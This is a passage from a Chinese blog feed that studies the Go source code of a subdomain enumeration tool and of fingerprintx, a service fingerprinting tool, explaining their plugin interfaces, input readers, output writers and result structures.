class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(r *Runner)</span></span> filterAndMatchSubdomain(subdomain <span class="hljs-type">string</span>) <span class="hljs-type">bool</span> &#123;<br><span class="hljs-comment">// 过滤的正则匹配</span><br><span class="hljs-keyword">if</span> r.options.filterRegexes != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">for</span> _, filter := <span class="hljs-keyword">range</span> r.options.filterRegexes &#123;<br><span class="hljs-keyword">if</span> m := filter.MatchString(subdomain); m &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-comment">// 结果的正则匹配</span><br><span class="hljs-keyword">if</span> r.options.matchRegexes != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">for</span> _, match := <span class="hljs-keyword">range</span> r.options.matchRegexes &#123;<br><span class="hljs-keyword">if</span> m := match.MatchString(subdomain); m &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br>    <span class="hljs-comment">// 默认的直接返回 true</span><br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br></code></pre></td></tr></table></figure><p>这里一般是空的，所以具体实现子域名提取的是数据源本身，比如 fofa 这里：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">if</span> response.Size &gt; <span class="hljs-number">0</span> &#123;<br>    <span class="hljs-keyword">for</span> _, subdomain := <span class="hljs-keyword">range</span> response.Results &#123;<br>        <span class="hljs-keyword">if</span> strings.HasPrefix(strings.ToLower(subdomain), <span class="hljs-string">&quot;http://&quot;</span>) || strings.HasPrefix(strings.ToLower(subdomain), <span class="hljs-string">&quot;https://&quot;</span>) &#123;<br>            subdomain = subdomain[strings.Index(subdomain, <span class="hljs-string">&quot;//&quot;</span>)+<span class="hljs-number">2</span>:]<br>        &#125;<br>        re := regexp.MustCompile(<span class="hljs-string">`:\d+$`</span>)<br>        <span class="hljs-keyword">if</span> re.MatchString(subdomain) &#123;<br>            subdomain = re.ReplaceAllString(subdomain, <span class="hljs-string">&quot;&quot;</span>)<br>        &#125;<br>        results &lt;- subscraping.Result&#123;Source: s.Name(), Type: subscraping.Subdomain, Value: subdomain&#125;<br>        s.results++<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>一些数据源也使用了这种匹配：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20240310131936212.png?imageSlim" alt="image-20240310131936212"></p><p>最后再看一下 runner.go：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(r *Runner)</span></span> EnumerateMultipleDomainsWithCtx(ctx context.Context, reader io.Reader, writers []io.Writer) <span class="hljs-type">error</span> &#123;<br>scanner := bufio.NewScanner(reader)<br>ip, _ := regexp.Compile(<span class="hljs-string">`^([0-9\.]+$)`</span>)<br>    <span class="hljs-comment">// scanner 遍历 reader </span><br><span class="hljs-keyword">for</span> scanner.Scan() &#123;<br>domain, err := normalizeLowercase(scanner.Text())<br>        <span class="hljs-comment">// 对于 IP 目标</span><br>isIp := ip.MatchString(domain)<br><span class="hljs-keyword">if</span> errors.Is(err, ErrEmptyInput) || (r.options.ExcludeIps &amp;&amp; isIp) &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br><br><span class="hljs-keyword">var</span> file *os.File<br><span class="hljs-comment">// If the user has specified an output file, use that output file instead</span><br><span class="hljs-comment">// of creating a new output file for each domain. Else create a new file</span><br><span class="hljs-comment">// for each domain in the directory.</span><br><span class="hljs-keyword">if</span> r.options.OutputFile != <span class="hljs-string">&quot;&quot;</span> &#123;<br>outputWriter := NewOutputWriter(r.options.JSON)<br>file, err = outputWriter.createFile(r.options.OutputFile, <span class="hljs-literal">true</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>gologger.Error().Msgf(<span class="hljs-string">&quot;Could not create file %s for %s: %s\n&quot;</span>, r.options.OutputFile, r.options.Domain, err)<br><span class="hljs-keyword">return</span> err<br>&#125;<br><br>err = r.EnumerateSingleDomainWithCtx(ctx, domain, <span class="hljs-built_in">append</span>(writers, file))<br><br>file.Close()<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> r.options.OutputDirectory != <span class="hljs-string">&quot;&quot;</span> &#123;<br>outputFile := path.Join(r.options.OutputDirectory, domain)<br><span class="hljs-keyword">if</span> r.options.JSON &#123;<br>outputFile += <span class="hljs-string">&quot;.json&quot;</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>outputFile += <span class="hljs-string">&quot;.txt&quot;</span><br>&#125;<br><br>outputWriter := NewOutputWriter(r.options.JSON)<br>file, err = outputWriter.createFile(outputFile, <span class="hljs-literal">false</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>gologger.Error().Msgf(<span class="hljs-string">&quot;Could not create file %s for %s: %s\n&quot;</span>, r.options.OutputFile, r.options.Domain, err)<br><span class="hljs-keyword">return</span> err<br>&#125;<br><span class="hljs-comment">// 添加一个 writer 类型</span><br>err = r.EnumerateSingleDomainWithCtx(ctx, domain, <span class="hljs-built_in">append</span>(writers, file))<br><br>file.Close()<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>err = r.EnumerateSingleDomainWithCtx(ctx, domain, writers)<br>&#125;<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到它传输目标使用的是 io.Reader 而不是通道或者切片，这种方式的好处挺多的：</p><ol><li>多种格式的目标输入 </li><li>不需要把目标一次性全部添加到内存中 而是使用 scanner 去读取</li></ol><p>可以看到它对于输入目标的处理：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(r *Runner)</span></span> RunEnumerationWithCtx(ctx context.Context) <span class="hljs-type">error</span> &#123;<br><span class="hljs-comment">// 默认的有一个 output 的 writer</span><br>outputs := []io.Writer&#123;r.options.Output&#125;<br><span class="hljs-comment">// 单个目标</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(r.options.Domain) &gt; <span class="hljs-number">0</span> &#123;<br>domainsReader := strings.NewReader(strings.Join(r.options.Domain, <span class="hljs-string">&quot;\n&quot;</span>))<br><span class="hljs-keyword">return</span> r.EnumerateMultipleDomainsWithCtx(ctx, domainsReader, outputs)<br>&#125;<br><span class="hljs-comment">// 文件</span><br><span class="hljs-comment">// If we have multiple domains as input,</span><br><span class="hljs-keyword">if</span> r.options.DomainsFile != <span class="hljs-string">&quot;&quot;</span> &#123;<br>f, err := os.Open(r.options.DomainsFile)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br>err = r.EnumerateMultipleDomainsWithCtx(ctx, f, outputs)<br>f.Close()<br><span class="hljs-keyword">return</span> err<br>&#125;<br><span class="hljs-comment">// os.Stdin </span><br><span class="hljs-comment">// If we have STDIN input, treat it as multiple domains</span><br><span class="hljs-keyword">if</span> r.options.Stdin &#123;<br><span class="hljs-keyword">return</span> r.EnumerateMultipleDomainsWithCtx(ctx, os.Stdin, outputs)<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p>输出那里它使用的是 writers []io.Writer 好处也很多，默认是一个输出，然后可以根据参数去添加一个文件写入流，最后遍历写入 writer 就行了。</p><h2 id="学习总结"><a href="#学习总结" class="headerlink" title="学习总结"></a>学习总结</h2><ol><li>泛解析黑名单处理</li><li>reader、writers</li></ol>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 源码学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fingerprintx 源码学习</title>
      <link href="/2024/02/20/%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/fingerprintx/"/>
      <url>/2024/02/20/%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/fingerprintx/</url>
      
        <content type="html"><![CDATA[<h2 id="项目介绍"><a href="#项目介绍" class="headerlink" title="项目介绍"></a>项目介绍</h2><p>项目地址：<a href="https://github.com/praetorian-inc/fingerprintx">https://github.com/praetorian-inc/fingerprintx</a></p><p>fingerprintx 是一款端口识别工具，支持协议如下：</p><table><thead><tr><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td>SERVICE</td><td>TRANSPORT</td><td>SERVICE</td><td>TRANSPORT</td></tr><tr><td>HTTP</td><td>TCP</td><td>REDIS</td><td>TCP</td></tr><tr><td>SSH</td><td>TCP</td><td>MQTT3</td><td>TCP</td></tr><tr><td>MODBUS</td><td>TCP</td><td>VNC</td><td>TCP</td></tr><tr><td>TELNET</td><td>TCP</td><td>MQTT5</td><td>TCP</td></tr><tr><td>FTP</td><td>TCP</td><td>RSYNC</td><td>TCP</td></tr><tr><td>SMB</td><td>TCP</td><td>RPC</td><td>TCP</td></tr><tr><td>DNS</td><td>TCP</td><td>OracleDB</td><td>TCP</td></tr><tr><td>SMTP</td><td>TCP</td><td>RTSP</td><td>TCP</td></tr><tr><td>PostgreSQL</td><td>TCP</td><td>MQTT5</td><td>TCP (TLS)</td></tr><tr><td>RDP</td><td>TCP</td><td>HTTPS</td><td>TCP (TLS)</td></tr><tr><td>POP3</td><td>TCP</td><td>SMTPS</td><td>TCP (TLS)</td></tr><tr><td>KAFKA</td><td>TCP</td><td>MQTT3</td><td>TCP (TLS)</td></tr><tr><td>MySQL</td><td>TCP</td><td>RDP</td><td>TCP (TLS)</td></tr><tr><td>MSSQL</td><td>TCP</td><td>POP3S</td><td>TCP (TLS)</td></tr><tr><td>LDAP</td><td>TCP</td><td>LDAPS</td><td>TCP (TLS)</td></tr><tr><td>IMAP</td><td>TCP</td><td>IMAPS</td><td>TCP (TLS)</td></tr><tr><td>SNMP</td><td>UDP</td><td>Kafka</td><td>TCP (TLS)</td></tr><tr><td>OPENVPN</td><td>UDP</td><td>NETBIOS-NS</td><td>UDP</td></tr><tr><td>IPSEC</td><td>UDP</td><td>DHCP</td><td>UDP</td></tr><tr><td>STUN</td><td>UDP</td><td>NTP</td><td>UDP</td></tr><tr><td>DNS</td><td>UDP</td><td></td><td></td></tr></tbody></table><h2 id="项目结构"><a href="#项目结构" class="headerlink" title="项目结构"></a>项目结构</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell">pkg<br>├── plugins<br>│   │   ├── plugins.go# 插件注册相关<br>│   │   ├── pluginutils<br>│   │   │   ├── error.go<br>│   │   │   └── requests.go# 向 conn 中写入数据 读取数据<br>│   │   ├── services# 各种服务的识别插件、都实现了插件接口<br>│   │   └── types.go# 插件接口、各种服务的详细数据结构体（ 实现 Metadata 接口 ）<br>│   ├── runner<br>│   │   ├── report.go# 输出格式 JSON CSV <br>│   │   ├── root.go# cobra cli 参数解析 程序入口<br>│   │   ├── target.go# 解析命令行参数的目标为 plugins.Target<br>│   │   ├── types.go# cliConfig 结构体 参数相关<br>│   │   └── utils.go# 一些工具类<br>│   ├── scan<br>│   │   ├── plugin_list.go# import 导入所有插件包 ( 插件注册 )<br>│   │   ├── scan_api.go# API 可以直接调用 ScanTargets 完成指纹识别<br>│   │   ├── simple_scan.go# 具体的识别逻辑<br>│   │   └── types.go# config 结构体<br></code></pre></td></tr></table></figure><h2 id="源码学习"><a href="#源码学习" class="headerlink" title="源码学习"></a>源码学习</h2><p>fingerprintx 的端口指纹识别是以插件的形式完成的，感觉很整齐，这种类型的项目看起来也很舒服：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20240302201011679.png?imageSlim" alt="image-20240302201011679"></p><p>这些识别插件都实现了插件接口：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Plugin <span class="hljs-keyword">interface</span> &#123;<br>Run(net.Conn, time.Duration, Target) (*Service, <span class="hljs-type">error</span>) <span class="hljs-comment">// 识别的主逻辑</span><br>PortPriority(<span class="hljs-type">uint16</span>) <span class="hljs-type">bool</span>                              <span class="hljs-comment">// 端口优先权</span><br>Name() <span class="hljs-type">string</span>                                          <span class="hljs-comment">// 名称</span><br>Type() Protocol                                        <span class="hljs-comment">// 协议</span><br>Priority() <span class="hljs-type">int</span>                                         <span class="hljs-comment">// 优先级端口</span><br>&#125;<br></code></pre></td></tr></table></figure><p>这里的 PortPriority 表示的是端口优先权，比如 80 对应的是 http 服务，那么 http 识别插件的 PortPriority(80) 就会返回 true。</p><p>Priority 是端口优先级，如果优先权未识别出端口，那就会按照服务的优先级进行指纹识别。</p><p>很好的思路，而且这种思路使用了这样的写法，很整齐，之前的 go-Portscan 虽然也是这种思路，但是写法和 fingerprintx 比起来就有点乱。</p><p>先看一个指纹识别插件，这是 HTTP 包下面的，它实现了 HTTP 和 HTTPS 这里只留 HTTP 的写一下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> HTTPPlugin <span class="hljs-keyword">struct</span> &#123;<br>analyzer *wappalyzer.Wappalyze<br>&#125;<br><br><span class="hljs-keyword">const</span> HTTP = <span class="hljs-string">&quot;http&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span> &#123;<br>wappalyzerClient, err := wappalyzer.New()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-built_in">panic</span>(<span class="hljs-string">&quot;unable to initialize wappalyzer library&quot;</span>)<br>&#125;<br>    <span class="hljs-comment">// 注册 http 插件</span><br>plugins.RegisterPlugin(&amp;HTTPPlugin&#123;analyzer: wappalyzerClient&#125;)<br>&#125;<br><br><span class="hljs-comment">// http 对应可能的端口 =&gt; 端口优先权</span><br><span class="hljs-keyword">var</span> (<br>commonHTTPPorts = <span class="hljs-keyword">map</span>[<span class="hljs-type">int</span>]<span class="hljs-keyword">struct</span>&#123;&#125;&#123;<br><span class="hljs-number">80</span>:   &#123;&#125;,<br><span class="hljs-number">3000</span>: &#123;&#125;,<br><span class="hljs-number">4567</span>: &#123;&#125;,<br><span class="hljs-number">5000</span>: &#123;&#125;,<br><span class="hljs-number">8000</span>: &#123;&#125;,<br><span class="hljs-number">8001</span>: &#123;&#125;,<br><span class="hljs-number">8080</span>: &#123;&#125;,<br><span class="hljs-number">8081</span>: &#123;&#125;,<br><span class="hljs-number">8888</span>: &#123;&#125;,<br><span class="hljs-number">9001</span>: &#123;&#125;,<br><span class="hljs-number">9080</span>: &#123;&#125;,<br><span class="hljs-number">9090</span>: &#123;&#125;,<br><span class="hljs-number">9100</span>: &#123;&#125;,<br>&#125;<br>)<br><span class="hljs-comment">// 优先权判断</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p *HTTPPlugin)</span></span> PortPriority(port <span class="hljs-type">uint16</span>) <span class="hljs-type">bool</span> &#123;<br>_, ok := commonHTTPPorts[<span class="hljs-type">int</span>(port)]<br><span class="hljs-keyword">return</span> ok<br>&#125;<br><span class="hljs-comment">// 指纹识别的主函数</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p *HTTPPlugin)</span></span> Run(conn net.Conn, timeout time.Duration, target plugins.Target) (*plugins.Service, <span class="hljs-type">error</span>) &#123;<br>    <span class="hljs-comment">// 对于 HTTP 协议的识别 直接发送 HTTP 请求</span><br>req, err := http.NewRequest(<span class="hljs-string">&quot;GET&quot;</span>, fmt.Sprintf(<span class="hljs-string">&quot;http://%s&quot;</span>, conn.RemoteAddr().String()), <span class="hljs-literal">nil</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">if</span> errors.Is(err, syscall.ECONNREFUSED) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span><br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, &amp;utils.RequestError&#123;Message: err.Error()&#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> target.Host != <span class="hljs-string">&quot;&quot;</span> &#123;<br>req.Host = target.Host<br>&#125;<br><br><span class="hljs-comment">// http client with custom dialier to use the provided net.Conn</span><br>client := http.Client&#123;<br>Timeout: timeout,<br>Transport: &amp;http.Transport&#123;<br>DialContext: <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(ctx context.Context, network, addr <span class="hljs-type">string</span>)</span></span> (net.Conn, <span class="hljs-type">error</span>) &#123;<br><span class="hljs-keyword">return</span> conn, <span class="hljs-literal">nil</span><br>&#125;,<br>&#125;,<br>CheckRedirect: <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(req *http.Request, via []*http.Request)</span></span> <span class="hljs-type">error</span> &#123;<br><span class="hljs-keyword">return</span> http.ErrUseLastResponse<br>&#125;,<br>&#125;<br><br>resp, err := client.Do(req)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, &amp;utils.RequestError&#123;Message: err.Error()&#125;<br>&#125;<br><span class="hljs-keyword">defer</span> resp.Body.Close()<br><span class="hljs-comment">// 进行 WEB 指纹识别 wappalyzergo</span><br>technologies, _ := p.FingerprintResponse(resp)<br><br>payload := plugins.ServiceHTTP&#123;<br>Status:          resp.Status,<br>StatusCode:      resp.StatusCode,<br>ResponseHeaders: resp.Header,<br>&#125;<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(technologies) &gt; <span class="hljs-number">0</span> &#123;<br>payload.Technologies = technologies<br>&#125;<br><span class="hljs-comment">// 使用 CreateServiceFrom 生成一个结果 fingerprintx 这个地方也很好</span><br><span class="hljs-keyword">return</span> plugins.CreateServiceFrom(target, payload, <span class="hljs-literal">false</span>, resp.Header.Get(<span class="hljs-string">&quot;Server&quot;</span>), plugins.TCP), <span class="hljs-literal">nil</span><br>&#125;<br><br><span class="hljs-comment">// TCP 类型的</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p *HTTPPlugin)</span></span> Type() plugins.Protocol &#123;<br><span class="hljs-keyword">return</span> plugins.TCP<br>&#125;<br><br><span class="hljs-comment">// 优先级第一</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p *HTTPPlugin)</span></span> Priority() <span class="hljs-type">int</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p *HTTPPlugin)</span></span> Name() <span class="hljs-type">string</span> &#123;<br><span class="hljs-keyword">return</span> HTTP<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p *HTTPPlugin)</span></span> FingerprintResponse(resp *http.Response) ([]<span class="hljs-type">string</span>, <span class="hljs-type">error</span>) &#123;<br><span class="hljs-keyword">return</span> fingerprint(resp, p.analyzer)<br>&#125;<br><br><span class="hljs-comment">// 调用 wappalyzerClient 进行指纹识别</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">fingerprint</span><span class="hljs-params">(resp *http.Response, analyzer *wappalyzer.Wappalyze)</span></span> ([]<span class="hljs-type">string</span>, <span class="hljs-type">error</span>) &#123;<br><span class="hljs-keyword">var</span> technologies []<span class="hljs-type">string</span><br>data, err := ioutil.ReadAll(resp.Body)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br>fingerprint := analyzer.Fingerprint(resp.Header, data)<br><span class="hljs-keyword">for</span> tech := <span class="hljs-keyword">range</span> fingerprint &#123;<br>technologies = <span class="hljs-built_in">append</span>(technologies, tech)<br>&#125;<br><br><span class="hljs-keyword">return</span> technologies, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p>指纹识别和之前的 go-Portscan 略有不同，go-Portscan 是统一的，只分了协议、发送动作、接收判断规则。而 fingerprintx 则是对每种协议都做了处理，而且还会获取其详细信息，比如这里的 http 就会进行指纹识别。</p><p>再说一下 plugins.CreateServiceFrom 函数，上面说了他对很多规则都做了详细信息的获取函数，但是这些信息的结构是不同的，比如 HTTP 这里就是 plugins.ServiceHTTP 结构，看看 fingerprintx 是如果去处理：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">CreateServiceFrom</span><span class="hljs-params">(target Target, m Metadata, tls <span class="hljs-type">bool</span>, version <span class="hljs-type">string</span>, transport Protocol)</span></span> *Service &#123;<br>service := Service&#123;&#125;<br>    <span class="hljs-comment">// 将指纹数据直接转换成 json plugins.ServiceHTTP 实现了 Metadata 接口</span><br>b, _ := json.Marshal(m)<br>service.Host = target.Host<br>service.IP = target.Address.Addr().String()<br>service.Port = <span class="hljs-type">int</span>(target.Address.Port())<br>service.Protocol = m.Type()<br>service.Transport = strings.ToLower(transport.String())<br>service.Raw = json.RawMessage(b)<br><span class="hljs-keyword">if</span> version != <span class="hljs-string">&quot;&quot;</span> &#123;<br>service.Version = version<br>&#125;<br>service.TLS = tls<br><span class="hljs-keyword">return</span> &amp;service<br>&#125;<br></code></pre></td></tr></table></figure><p>Metadata 接口只有一个 Type 方法：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Metadata <span class="hljs-keyword">interface</span> &#123;<br>Type() <span class="hljs-type">string</span><br>&#125;<br></code></pre></td></tr></table></figure><p>HTTP 的就是这个了：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> ServiceHTTP <span class="hljs-keyword">struct</span> &#123;<br>Status          <span class="hljs-type">string</span>      <span class="hljs-string">`json:&quot;status&quot;`</span>     <span class="hljs-comment">// e.g. &quot;200 OK&quot;</span><br>StatusCode      <span class="hljs-type">int</span>         <span class="hljs-string">`json:&quot;statusCode&quot;`</span> <span class="hljs-comment">// e.g. 200</span><br>ResponseHeaders http.Header <span class="hljs-string">`json:&quot;responseHeaders&quot;`</span><br>Technologies    []<span class="hljs-type">string</span>    <span class="hljs-string">`json:&quot;technologies,omitempty&quot;`</span><br>&#125;<br></code></pre></td></tr></table></figure><p>再后面输出的时候，都直接调用的是 Service 接口的 Metadata 方法，其按照不同的数据格式进行对应的 json 序列化，这样就解决了输出 json 格式的问题：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 